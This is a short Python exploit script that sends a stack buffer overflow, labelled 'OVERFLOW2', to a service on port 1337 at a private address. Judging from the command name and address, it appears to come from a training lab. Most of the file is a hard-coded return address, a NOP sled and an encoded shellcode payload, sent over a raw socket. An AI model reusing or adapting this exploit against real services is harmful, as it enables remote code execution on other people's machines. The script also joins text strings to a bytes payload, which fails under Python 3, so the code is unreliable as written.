#!/usr/bin/env python3

import socket

ip = "10.10.98.11"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload =  b""
payload += b"\xfc\xbb\x11\x96\x09\xa9\xeb\x0c\x5e\x56\x31"
payload += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
payload += b"\xff\xff\xff\xed\x7e\x8b\xa9\x0d\x7f\xec\x20"
payload += b"\xe8\x4e\x2c\x56\x79\xe0\x9c\x1c\x2f\x0d\x56"
payload += b"\x70\xdb\x86\x1a\x5d\xec\x2f\x90\xbb\xc3\xb0"
payload += b"\x89\xf8\x42\x33\xd0\x2c\xa4\x0a\x1b\x21\xa5"
payload += b"\x4b\x46\xc8\xf7\x04\x0c\x7f\xe7\x21\x58\xbc"
payload += b"\x8c\x7a\x4c\xc4\x71\xca\x6f\xe5\x24\x40\x36"
payload += b"\x25\xc7\x85\x42\x6c\xdf\xca\x6f\x26\x54\x38"
payload += b"\x1b\xb9\xbc\x70\xe4\x16\x81\xbc\x17\x66\xc6"
payload += b"\x7b\xc8\x1d\x3e\x78\x75\x26\x85\x02\xa1\xa3"
payload += b"\x1d\xa4\x22\x13\xf9\x54\xe6\xc2\x8a\x5b\x43"
payload += b"\x80\xd4\x7f\x52\x45\x6f\x7b\xdf\x68\xbf\x0d"
payload += b"\x9b\x4e\x1b\x55\x7f\xee\x3a\x33\x2e\x0f\x5c"
payload += b"\x9c\x8f\xb5\x17\x31\xdb\xc7\x7a\x5e\x28\xea"
payload += b"\x84\x9e\x26\x7d\xf7\xac\xe9\xd5\x9f\x9c\x62"
payload += b"\xf0\x58\xe2\x58\x44\xf6\x1d\x63\xb5\xdf\xd9"
payload += b"\x37\xe5\x77\xcb\x37\x6e\x87\xf4\xed\x21\xd7"
payload += b"\x5a\x5e\x82\x87\x1a\x0e\x6a\xcd\x94\x71\x8a"
payload += b"\xee\x7e\x1a\x21\x15\xe9\x2f\xbc\x77\xe2\x47"
payload += b"\xc2\x77\xf1\xae\x4b\x91\x93\xc0\x1d\x0a\x0c"
payload += b"\x78\x04\xc0\xad\x85\x92\xad\xee\x0e\x11\x52"
payload += b"\xa0\xe6\x5c\x40\x55\x07\x2b\x3a\xf0\x18\x81"
payload += b"\x52\x9e\x8b\x4e\xa2\xe9\xb7\xd8\xf5\xbe\x06"
payload += b"\x11\x93\x52\x30\x8b\x81\xae\xa4\xf4\x01\x75"
payload += b"\x15\xfa\x88\xf8\x21\xd8\x9a\xc4\xaa\x64\xce"
payload += b"\x98\xfc\x32\xb8\x5e\x57\xf5\x12\x09\x04\x5f"
payload += b"\xf2\xcc\x66\x60\x84\xd0\xa2\x16\x68\x60\x1b"
payload += b"\x6f\x97\x4d\xcb\x67\xe0\xb3\x6b\x87\x3b\x70"
payload += b"\x8b\x6a\xe9\x8d\x24\x33\x78\x2c\x29\xc4\x57"
payload += b"\x73\x54\x47\x5d\x0c\xa3\x57\x14\x09\xef\xdf"
payload += b"\xc5\x63\x60\x8a\xe9\xd0\x81\x9f\xe9\xd6\x7d"
payload += b"\x20"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")